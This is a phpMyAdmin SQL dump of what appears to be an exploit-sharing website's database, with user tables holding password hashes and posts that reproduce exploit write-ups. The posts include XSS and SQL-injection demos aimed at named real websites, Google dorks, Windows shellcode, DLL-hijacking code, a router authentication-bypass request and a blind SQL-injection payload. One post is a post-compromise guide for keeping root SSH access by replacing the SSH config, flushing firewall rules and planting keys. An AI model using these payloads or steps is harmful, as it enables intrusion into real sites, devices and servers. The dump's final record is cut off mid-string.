-- phpMyAdmin SQL Dump
-- version 4.6.6
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 18, 2019 at 08:02 PM
-- Server version: 5.7.17-log
-- PHP Version: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `ex`
--

-- --------------------------------------------------------

--
-- Table structure for table `author`
--

CREATE TABLE `author` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` text NOT NULL,
  `rows` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `author`
--

INSERT INTO `author` (`id`, `name`, `email`, `rows`) VALUES
(1, 'kadnass-dz', 'virus_dz19@yahoo.com', 1),
(2, 'kader', 'kader@gmail.com', 0),
(3, 'dz', 'dz@dz.dz', 0);

-- --------------------------------------------------------

--
-- Table structure for table `categery`
--

CREATE TABLE `categery` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `categery`
--

INSERT INTO `categery` (`id`, `name`) VALUES
(1, 'WebApps'),
(2, 'RL_exploits'),
(3, 'Papers'),
(4, 'Tools');

-- --------------------------------------------------------

--
-- Table structure for table `dz`
--

CREATE TABLE `dz` (
  `id` int(11) NOT NULL,
  `user` text NOT NULL,
  `pass` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `dz`
--

INSERT INTO `dz` (`id`, `user`, `pass`) VALUES
(1, 'dz', '4c47bbe20f35028518127ae3a06f4e8a5358e424');

-- --------------------------------------------------------

--
-- Table structure for table `modcp`
--

CREATE TABLE `modcp` (
  `id` int(11) NOT NULL,
  `user` text NOT NULL,
  `pass` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `modcp`
--

INSERT INTO `modcp` (`id`, `user`, `pass`) VALUES
(1, 'dz', '4c47bbe20f35028518127ae3a06f4e8a5358e424');

-- --------------------------------------------------------

--
-- Table structure for table `page`
--

CREATE TABLE `page` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `page`
--

INSERT INTO `page` (`id`, `title`, `body`) VALUES
(1, 'Team', '<!DOCTYPE html>\r\n<html>\r\n<head>\r\n</head>\r\n<body>\r\n<table style=\"border-collapse: collapse; width: 58.478%; height: 86px; margin-left: auto; margin-right: auto;\" border=\"1\">\r\n<tbody>\r\n<tr>\r\n<td style=\"width: 100%;\">\r\n<h1 style=\"text-align: center;\"><em><span style=\"color: #3366ff;\"><strong>BY X19</strong></span></em></h1>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<h1 style=\"text-align: center;\"><strong>&nbsp;</strong></h1>\r\n<p style=\"text-align: center;\">&nbsp;</p>\r\n</body>\r\n</html>'),
(2, 'Submit', '<!DOCTYPE html>\r\n<html>\r\n<head>\r\n</head>\r\n<body>\r\n<table style=\"border-collapse: collapse; width: 71.5227%; height: 113px; margin-left: auto; margin-right: auto;\" border=\"1\">\r\n<tbody>\r\n<tr>\r\n<td style=\"width: 100%;\">\r\n<h1 style=\"text-align: center;\"><strong><span style=\"color: #999999;\">coded by el x19</span></strong></h1>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</body>\r\n</html>');

-- --------------------------------------------------------

--
-- Table structure for table `platform`
--

CREATE TABLE `platform` (
  `id` int(11) NOT NULL,
  `plat` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `platform`
--

INSERT INTO `platform` (`id`, `plat`) VALUES
(1, 'php'),
(2, 'asp'),
(3, 'python'),
(4, 'perl'),
(10, 'windows');

-- --------------------------------------------------------

--
-- Table structure for table `post`
--

CREATE TABLE `post` (
  `id` int(11) NOT NULL,
  `cat` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` text NOT NULL,
  `author` varchar(255) NOT NULL,
  `tags` varchar(255) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `platform` text NOT NULL,
  `cate` text NOT NULL,
  `hits` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `post`
--

INSERT INTO `post` (`id`, `cat`, `title`, `body`, `author`, `tags`, `date`, `platform`, `cate`, `hits`) VALUES
(1, 1, 'XSS Vulnerability', '|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Exploit Title: dgsite.ir XSS Vulnerability\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Vendor site: http://www.synatech.ir/\r\n\r\n\r\n\r\n|[+] Google Dork: N/A\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Demo:\r\n\r\n \r\n\r\nhttp://www.synatech.ir/per/details.php?id=1\r\n\r\n\r\n\r\n              \"><script>alert(\"Bl4ck M4n\")</script>\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Exploit Author: Bl4ck M4n\r\n\r\n\r\n\r\n|[+] Sit: und3rgr0und\r\n\r\n\r\n\r\n|[+] Tested on: Windows 8 , parrot os\r\n\r\n\r\n\r\n|[+]     saeid.saeid081@gmail.com \r\n\r\n\r\n\r\n|[+]     joker_s_hack_s@yahoo.com\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]', 'x19', 'xss sql bug', '2018-08-15 12:30:49', 'php', 'WebApp', 8),
(2, 1, 'sql Vulnerability', '############################################\n\n# Title :  Powered by en/publications mililink.com sql injection\n\n# Author : Rednofozi\n\n# category : webapps\n\n# Tested On : Win 8 , Kali Linux\n\n# my team:guardiran.org/profile/25294-rednofozi/ \n\n# me : Rednofozi@yahoo.com\n\n# Vendor HomePage : mililink.com\n\n# Google Dork: \"Powered by en/publications\".php?id=\n\n############################################\n# search google Dork : \"Powered by en/publications\".php?id=\n####################Proof of Concept #############\n#Demo :\nhttp://www.mililink.com/journals_ag.php?id=60\' [Sql injection Vulnerability]\nhttp://www.cosspak.org/publications.php?id=5\'[Sql injection Vulnerability]\n# Discovered by : Rednofozi', 'x19', 'xss sql bug', '2018-08-15 12:30:49', 'php', 'WebApp', 4),
(3, 2, 'Windows7 Force Shutdown Shellcode v.1', '\r\n# Windows7 Force Shutdown Shellcode v.1        \r\n\r\n\r\n\r\n\r\n\r\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n/*------------------------------------------------\r\n\r\n\r\n\r\n==[ By rednofozi ]======[ Coders ]========================================\r\n\r\n\r\n\r\n--------------------------------------------------\r\n\r\n\r\n\r\n    title : Windows7 Force Shutdown Shellcod .v1\r\n\r\n\r\n\r\n    Author: rednofozi\r\n\r\n\r\n\r\n    Category: local\r\n\r\n\r\n\r\n    Tested on: Windows7 Ultimate x 64 bit\r\n\r\n\r\n\r\n    Code : c++\r\n\r\n\r\n\r\n    myweb:  http://guardiran.org\r\n\r\n\r\n\r\n------------------------------------------------ */\r\n\r\n\r\n\r\n#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\nchar code[] = \"\\x33\\xF6\\x33\\xC9\\x64\\x8B\\x71\\x30\\x8B\\x76\\x0C\\x8B\\x76\\x1C\\x33\\xDB\\x43\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\xB8\\x11\\x11\\x11\\x11\\xB9\\x14\"\r\n\r\n\r\n\r\n\"\\x11\\x11\\x11\\x2B\\xC8\\x8B\\xD1\\x3B\\xDA\\x75\\xE5\\xB9\\x73\\x31\\x11\\x11\\x2B\\xC8\\x03\\xE9\\x8B\\xD4\\xB9\\x10\\x21\\x11\\x11\\x2B\\xC8\\x2B\\xD1\\xB9\"\r\n\r\n\r\n\r\n\"\\x63\\x6D\\x64\\x20\\x89\\x0A\\xB9\\x2F\\x6B\\x20\\x73\\x89\\x4A\\x04\\xB9\\x68\\x75\\x74\\x64\\x89\\x4A\\x08\\xB9\\x6F\\x77\\x6E\\x20\\x89\\x4A\\x0C\\xB9\\x2F\"\r\n\r\n\r\n\r\n\"\\x73\\x20\\x2F\\x89\\x4A\\x10\\xB9\\x74\\x20\\x30\\x20\\x89\\x4A\\x14\\xB9\\x40\\x77\\x11\\x11\\x2B\\xC8\\x89\\x4A\\x18\\x33\\xDB\\x8B\\xF4\\xB9\\x65\\x11\\x11\"\r\n\r\n\r\n\r\n\"\\x11\\x2B\\xC8\\x8D\\x4E\\xAC\\x51\\x8D\\x4E\\xBC\\x51\\x53\\x53\\xB9\\x31\\x13\\x11\\x11\\x2B\\xC8\\x51\\x53\\x53\\x53\\x52\\x53\\xFF\\xD5\\x33\\xF6\\x33\\xC9\"\r\n\r\n\r\n\r\n\"\\x64\\x8B\\x71\\x30\\x8B\\x76\\x0C\\x8B\\x76\\x1C\\x33\\xDB\\x43\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\xB8\\x11\\x11\\x11\\x11\\xB9\\x13\\x11\\x11\\x11\\x2B\"\r\n\r\n\r\n\r\n\"\\xC8\\x8B\\xD1\\x3B\\xDA\\x75\\xE5\\xB8\\x11\\x11\\x11\\x11\\xB9\\x37\\x26\\x14\\x11\\x2B\\xC8\\x03\\xE9\\xFF\\xD5\";\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\nint main(){printf(\"Shellcode Length is : %u\\n\",strlen(code));system(\"PAUSE\");\r\n\r\n\r\n\r\n    int (*_13)() = (int(*)())code; _13(); }\r\n\r\n ++++++++++++++++++++++++++++++++\r\n\r\nIn the name of Allah', 'rednofozi', '', '2018-08-17 10:17:51', 'win', ' Remote/Local Exploits', 0),
(4, 1, 'Designed  webofy.in SQL Injection', '|[+] Exploit Title: Site By : Designed By: webofy.in SQL Injection\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Google Dork: N/A\r\n\r\n\r\n\r\n|[+] Vendor site: http://www.uniholidays.in\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Demo: Sql\r\n\r\n \r\n\r\nhttp://www.uniholidays.in/view-details.php?id=27  \'\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]\r\n\r\n\r\n\r\n|[+] Exploit Author: Bl4ck M4n\r\n\r\n\r\n\r\n|[+]  und3rgr0und Lulzsec\r\n\r\n\r\n\r\n|[+] Tested on: Windows 8 , parrot os\r\n\r\n\r\n\r\n|[+]     saeid.saeid081@gmail.com \r\n\r\n\r\n\r\n|[+]     joker_s_hack_s@yahoo.com\r\n\r\n\r\n\r\n|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]|[+]', 'und3rgr0und', '', '2018-08-17 17:44:41', '', 'WebApp', 0),
(5, 3, 'test papers', 'test', 'test', '', '2018-08-21 20:29:50', '', 'Papers', 1),
(7, 1, ' ASUS-DSL N10 1.1.2.2_17 - Authentication Bypass', '############################################\r\n\r\n# Title : ASUS-DSL N10 1.1.2.2_17 - Authentication Bypass\r\n\r\n# Author :Rednofozi\r\n\r\n# category : webapps\r\n\r\n# Tested On : Kali Linux\r\n\r\n# my team:https://anonysec.org\r\n\r\n# me : Rednofozi@yahoo.com\r\n\r\n# Vendor HomePage :https://www.asus.com/Networking/DSLN10_C1_with_5dBi_antenna/\r\n\r\n# Google Dork: inurl:N/A\r\n\r\n# Sofrware version: 1.1.2.2_17\r\n\r\n############################################\r\n\r\n\r\n\r\n# search google Dork : N/A\r\n\r\n\r\n\r\n####################Proof of Concept #############\r\n\r\n\r\n\r\n# 1. Description:\r\n\r\n# In ASUS-DSL N10 C1 modem Firmware Version 1.1.2.2_17 there is login_authorization \r\n\r\n# parameter in post data, that use for authorization access to admin panel, \r\n\r\n# the data of this parameter is not fully random and you can use old data \r\n\r\n# or data of another device to access admin panel.\r\n\r\n\r\n\r\n# 2. Proof of Concept:\r\n\r\n# Browse http://<Your Modem IP>/login.cgi\r\n\r\n\r\n\r\n# Send this post data:\r\n\r\ngroup_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=YWRtaW46MQ%3D%2D\r\n\r\n\r\n\r\n# Or this post data:\r\n\r\ngroup_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=FWRtaW46MQ%3D5D\r\n\r\n######################\r\n\r\n\r\n\r\n\r\n\r\n# Discovered by : Rednofozi\r\n\r\n\r\n\r\n\r\n\r\n#--tnx to : ReZa CLONER  , Moeein Seven. DOCTOR ROBOT .soldier anonymous. milad shadow', 'ASUS', '', '2018-11-17 19:10:24', 'perl', ' Remote/Local Exploits', 3),
(8, 2, 'UltraISO Premium Edition DLL Hijacking Exploit (daemon.dll)', '#UltraISO Premium Edition DLL Hijacking Exploit (daemon.dll)\r\n\r\n#Author : Dmar al3noOoz\r\n\r\n#Software Link: https://www.ezbsystems.com/enindex.html\r\n\r\n#Version: All\r\n\r\n#Greetz : Group X5\r\n\r\n#Mail   : Dmaral3noOoz@gmail.com\r\n\r\n#Tested on: windows 10\r\n\r\n----------------------------------------------------------------------------------------------\r\n\r\n[*] Vulnerable extensions:\r\n\r\n\r\n\r\n.iso/.bin /.isz\r\n\r\n \r\n\r\n[*] Vulnerable Dlls:\r\n\r\n\r\n\r\ndaemon.dll\r\n\r\n\r\n\r\n----------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\n#include <windows.h>\r\n\r\n\r\n\r\n#define DllExport __declspec (dllexport)\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\nDllExport void hook_startup() { exp(); }\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\nint exp()\r\n\r\n\r\n\r\n{\r\n\r\n\r\n\r\n  WinExec(\"calc\", 0);\r\n\r\n\r\n\r\n  exit(0);\r\n\r\n\r\n\r\n  return 0;\r\n\r\n\r\n\r\n}', 'Dmar al3noOoz', '', '2018-11-17 19:11:05', 'windows', ' Remote/Local Exploits', 1),
(9, 2, 'Microsoft Windows Movie Maker DLL Hijacking Exploit  ', '#Microsoft Windows Movie Maker DLL Hijacking Exploit  \r\n\r\n#Author : Dmar al3noOoz\r\n\r\n#Software Link: https://www.microsoft.com/en-us/download/search.aspx?q=Movie%20Maker (Windows Essentials 2012)\r\n\r\n#Version: All\r\n\r\n#Greetz : Group X5 , Gr4y#H4t , Dr.SilenT , HitmanAlharbi , Sa.Exploit , 1337r00t\r\n\r\n#Mail   : Dmaral3noOoz@gmail.com\r\n\r\n#Tested on: windows 10\r\n\r\n----------------------------------------------------------------------------------------------\r\n\r\n==============================================================================================\r\n\r\n\r\n\r\n[*] Vulnerable extensions:\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n.mswmm\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n[*] Vulnerable Dlls:\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nwlidux.dll , wldcore.dll , uxcore.dll\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n==============================================================================================\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n#include <windows.h>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n#define DllExport __declspec (dllexport)\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nDllExport void hook_startup() { exp(); }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nint exp()\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n{\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  WinExec(\"calc\", 0);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  exit(0);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  return 0;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n}', 'Dmar al3noOoz', '', '2018-11-17 19:11:58', 'windows', ' Remote/Local Exploits', 0),
(10, 4, 'Get SSH Access After Rooting the Server', '|--------------------------------------------------------------|                                          \r\n\r\n|--------------------------------------------------------------|\r\n\r\n|[+] Exploit Title: Get SSH Access After Rooting the Server\r\n\r\n|[+] Date:14/10/2018\r\n\r\n|[+] Exploit Author :Rednofozi\r\n\r\n|[+] Tested on: : Windows 10 , parrot os\r\n\r\n|[+] MY page https://cxsecurity.com/author/Inj3ct0r\r\n\r\n|[+] MY page http://www.exploit4arab.org/author/308/Rednofozi\r\n\r\n|[+] ME:Rednfozi@yahoo.com\r\n\r\n|[+] ME:Rednofozi@hotmail.com\r\n\r\n|[+] ME:inj3ct0r@tuta.io\r\n\r\n|[+] fb.me :https://www.facebook.com/saeid.hat.3\r\n\r\n|--------------------------------------------------------------|\r\n\r\n|[+] RHG hackers iran team  \r\n\r\n################################################################\r\n\r\n.. this time I want to share a few tips, maybe some of you don\'t know. Normally those who have rooting the server with localroot dirtyc0w often have already escalated, add the user and change the password so that they cannot enter ssh because the ssh port is replaced, or the auth password is turned off (the sysadmin server is logged in using auth key). There are also cases where the privilege escalation process directly calls tty with the root id, but when adding a user it cannot because access to commands such as iptables passwd, etc. is restricted.\r\n\r\nOkay, we discussed the first case first.\r\n\r\ndirty cow exploit - execution of localroot - change user and password - can\'t enter ssh.\r\n\r\nThere are two possibilities, not allowed to login with a password, or indeed ssh can only be accessed via certain IPs (iptables settings).\r\n\r\nThe trick:\r\n\r\n......\r\n\r\nsu firefat\r\n\r\ncd /etc/ssh/\r\n\r\nrm sshd_config\r\n\r\nwget https://raw.githubusercontent.com/linuxsec/pentest/master/sshd.txt -O sshd_config\r\n\r\niptables -F\r\n\r\nservice ssh restart\r\n\r\n\r\n\r\n........\r\n\r\nThe command above will delete the ssh configuration that the sysadmin does and return it to the default settings where the login password is allowed and the port is on port 22. iptables -F is doing iptables flushing. This is to delete all existing iptables rules. So for example the initial rule only allows certain ips to log in to ssh, now we can log in to ssh from our ip.\r\n\r\nThe first above is the easiest case. Now the second one is quite a lot too\r\n\r\ndirty cow exploit - execution of localroot - change user and password - can\'t enter ssh - / bin / su denied\r\n\r\nNow if this one, we use the following trick.\r\n\r\nWe do server escalation with localroot which directly calls tty with root id.\r\n\r\nSo the process becomes\r\n\r\nexploit - run - root id\r\n\r\nlog:\r\n\r\n/ cowroot\r\n\r\nEscalation of privileged root privileges from DirtyCow\r\n\r\nBackup / usr / bin / passwd to / tmp / bak\r\n\r\nBinary size: 30768\r\n\r\nRace, this might take time ...\r\n\r\n/ usr / bin / passwd is overwritten\r\n\r\nPopping root shell.\r\n\r\nDon\'t forget to recover / tmp / bak\r\n\r\nthread stops\r\n\r\nthread stops\r\n\r\nroot @ whmdaqu [/ home / bugs / public_html /] #\r\n\r\n\r\n\r\nbecause our id is now root we just follow the command in the first case. Reset sshd config, iptables flush, add root equivalent user.\r\n\r\nWell the third case\r\n\r\nexploit - tty with root id - cannot execute the passwd, iptables and other commands.\r\n\r\nIt is possible that access to system commands is limited when we use tty.\r\n\r\nLog:\r\n\r\n\r\n\r\n    root @ server [/ root] # / usr / sbin / useradd dick -g root -d / home / dick\r\n\r\n    / usr / sbin / useradd dick -g root -d / home / dick\r\n\r\n    root @ server [/ root] # passwd dick\r\n\r\n    passwd root\r\n\r\n    root @ server [/ root] #\r\n\r\n\r\n\r\nyup, the password prompt doesn\'t want to be called.\r\n\r\nThis is because access to tty is limited. even if we have a root ID we cannot run the iptables command.\r\n\r\nThe trick I tried and worked on:\r\n\r\n\r\n\r\n    cd ~\r\n\r\n    ssh-keygen -t rsa\r\n\r\n    cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys\r\n\r\n    ssh root @ localhost\r\n\r\n\r\n\r\nWe use SSH access using auth key. Why on localhost, why doesn\'t it directly use auth key from our server? Here I assume the target server firewall is active and only allows SSH access from certain IPs.\r\n\r\nAfter adding ssh key, the following log:\r\n\r\n\r\n\r\n    root @ server [~] # ssh root @ localhost\r\n\r\n    ssh dick @ localhost\r\n\r\n    Attempting to create directory / root / perl5\r\n\r\n    root @ server [~] #\r\n\r\n\r\n\r\nIt looks the same but the first is tty, and the second is ssh shell.\r\n\r\nNow because what we have is no longer a limit or the limit of the command such as the iptables command cannot, the command passwd is gone. Then just follow the top fig.\r\n\r\nSo this tutorial, hopefully useful.\r\n\r\n-----------------------------------------------------------------------------------\r\n\r\n----------------------------------------------------------------------------------\r\n\r\n# Discovered by : inj3ct0r and Rednofozi\r\n\r\n\r\n\r\n#--tnx to : ReZa CLONER  , Moeein Seven. Rednofozi ', 'ASUS', '', '2018-11-17 19:12:44', 'python', 'Tools', 0),
(11, 1, 'CKfinder Flynax Vulnerability ', '##################################\r\n\r\nExploit title : CKfinder Flynax Vulnerability \r\n\r\nVendor : https://www.flynax.com\r\n\r\nAuthor :  Magelang1337\r\n\r\n\r\n\r\nDorks : 1. \"Sign in to Flynax Admin Panel\" \r\n\r\n            2. \"Login to Flynax Admin Panel\"\r\n\r\n\r\n\r\nExploit : target/libs/ckfinder/ckfinder.html\r\n\r\n\r\n\r\nUr file : files/files/file.txt\r\n\r\n\r\n\r\nDEMO : http://www.motoneed.in/\r\n\r\n            http://www.limoforsale.com/\r\n\r\n	    http://www.turkuvazemlak.net\r\n\r\n\r\n\r\n	   \r\n\r\nThanks : Magelang177 - Indonesia Defacer\r\n\r\n\r\n\r\n##################################', 'Magelang1337', '', '2018-11-18 22:14:40', 'php', '', 0),
(12, 1, 'Web Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability', '# Exploit Title : Web Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\n\r\n# Author [ Discovered By ] : KingSkrupellos from Cyberizm Digital Security Army\r\n\r\n# Date : 13/11/2018\r\n\r\n# Vendor Homepage : webportalpeople.com ~ ourclassonline.com \r\n\r\n# Tested On : Windows and Linux\r\n\r\n# Category : WebApps\r\n\r\n# Google Dorks : \r\n\r\nintext:\'\'To obtain a site like this for your class visit www.ourclassonline.com.\'\'\r\n\r\nintext:\'\'Copyright Web Portal People, LLC. 2018 - Maker of class reunion & family websites. All rights reserved.\'\'\r\n\r\n# Exploit Risk : Medium\r\n\r\n# CWE : CWE-264 - [ Permissions, Privileges, and Access Controls ]\r\n\r\n\r\n\r\n#################################################################################################', ' KingSkrupellos', '', '2018-11-18 22:15:10', 'asp', '', 0),
(13, 2, 'Web Portal People, LLC. 2018', '# Exploit Title : Web Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\n\r\n# Author [ Discovered By ] : KingSkrupellos from Cyberizm Digital Security Army\r\n\r\n# Date : 13/11/2018\r\n\r\n# Vendor Homepage : webportalpeople.com ~ ourclassonline.com \r\n\r\n# Tested On : Windows and Linux\r\n\r\n# Category : WebApps\r\n\r\n# Google Dorks : \r\n\r\nintext:\'\'To obtain a site like this for your class visit www.ourclassonline.com.\'\'\r\n\r\nintext:\'\'Copyright Web Portal People, LLC. 2018 - Maker of class reunion & family websites. All rights reserved.\'\'\r\n\r\n# Exploit Risk : Medium\r\n\r\n# CWE : CWE-264 - [ Permissions, Privileges, and Access Controls ]\r\n\r\n\r\n\r\n#################################################################################################', 'x19', '', '2018-11-18 22:15:38', 'perl', '', 0),
(14, 1, 'Web Portal People', 'Web Portal PeopleWeb Portal PeopleWeb Portal People', 'XWeb', '', '2018-11-18 22:15:47', 'php', '', 0),
(15, 1, 'Sample HTTP POST Request', '\r\n\r\n#  Title : Subex ROC Fraud Management System v7.4 Sql Injection vulnerability.\r\n\r\n\r\n\r\n# Author : Daya iLLi\r\n\r\n\r\n\r\n# Contact : www.facebook.com/dayailli.officiel\r\n\r\n\r\n\r\n# Risk : High\r\n\r\n\r\n\r\n# Date : 04/09/2014\r\n\r\n\r\n\r\n#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n\r\n\r\n\r\nDescription:\r\n\r\nSubex ROC Fraud Management System version 7.4 suffers from a remote unauthenticated time-based blind SQL injection vulnerability. \r\n\r\n\r\n\r\n	\r\n\r\n=======================================================================================\r\n\r\nSubex ROC Fraud Management System v7.4 - Unauthenticated Blind-Time Based SQL Injection\r\n\r\n=======================================================================================\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n[Summary]\r\n\r\n \r\n\r\nA parameter at the login page of Subex ROC Fraud Management platform is vulnerable to blind-time based SQL injection.\r\n\r\n \r\n\r\n \r\n\r\n[Vulnerability Details]\r\n\r\n \r\n\r\nAuthentication  : The exploitation can be performed by any unauthenticated user.\r\n\r\nPage     : http://ip:port/login/login\r\n\r\nBackend DB  : Oracle\r\n\r\nPOST Parameter   : ranger_user[name]\r\n\r\n \r\n\r\nSample HTTP POST Request - Data only:\r\n\r\n-------------------------------------\r\n\r\nranger_user%5Bname%5D=admin%27%20AND%203402%3D%28CASE%20WHEN%20%28ASCII%28SUBSTRC%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20GRANTED_ROLE%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DUSER%20AND%20GRANTED_ROLE%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%2C1%2C1%29%29%20%3E%2047%29%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%28114%29%2C5%29%20ELSE%203402%20END%29%20AND%20%27a%27%3D%27a&ranger_user%5Bpassword%5D=secuid0&commit=Login&ranger_user_i2%5Bfeatures%5D=0\r\n\r\n \r\n\r\nEffect, the page will load with a delay of 5 seconds if the current database user is a member of the database administrators.\r\n\r\n \r\n\r\nUsing similar SQL statements an unauthenticated malicious visitor is able to enumerate various information from the backend database including those of usernames and password hashes (select ranger_user_name,hashed_password from ROCDB.PASSWORDS where rownum<2). The hashes can further be cracked and be used to access the application. Obviously if the DB user for the application has enough privileges you may be able to own the whole Oracle server.\r\n\r\n \r\n\r\n \r\n\r\n[Timeline]\r\n\r\n \r\n\r\nFacebook : www.facebook.com/DayaiLLi.Officiel\r\n\r\nSkype : daya.illi\r\n\r\nTwitter : @DayaAnons\r\n\r\nAsk : Ask.fm/dayailli', 'Subex', '', '2018-11-18 22:16:53', 'php', '', 1),
(16, 1, 'Subex ROC Fraud Management System v7.4 Sql Injection vulnerability.', '\r\n\r\n#  Title : Subex ROC Fraud Management System v7.4 Sql Injection vulnerability.\r\n\r\n\r\n\r\n# Author : Daya iLLi\r\n\r\n\r\n\r\n# Contact : www.facebook.com/dayailli.officiel\r\n\r\n\r\n\r\n# Risk : High\r\n\r\n\r\n\r\n# Date : 04/09/2014\r\n\r\n\r\n\r\n#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n\r\n\r\n\r\nDescription:\r\n\r\nSubex ROC Fraud Management System version 7.4 suffers from a remote unauthenticated time-based blind SQL injection vulnerability. \r\n\r\n\r\n\r\n	\r\n\r\n=======================================================================================\r\n\r\nSubex ROC Fraud Management System v7.4 - Unauthenticated Blind-Time Based SQL Injection\r\n\r\n=======================================================================================\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n[Summary]\r\n\r\n \r\n\r\nA parameter at the login page of Subex ROC Fraud Management platform is vulnerable to blind-time based SQL injection.\r\n\r\n \r\n\r\n \r\n\r\n[Vulnerability Details]\r\n\r\n \r\n\r\nAuthentication  : The exploitation can be performed by any unauthenticated user.\r\n\r\nPage     : http://ip:port/login/login\r\n\r\nBackend DB  : Oracle\r\n\r\nPOST Parameter   : ranger_user[name]\r\n\r\n \r\n\r\nSample HTTP POST Request - Data 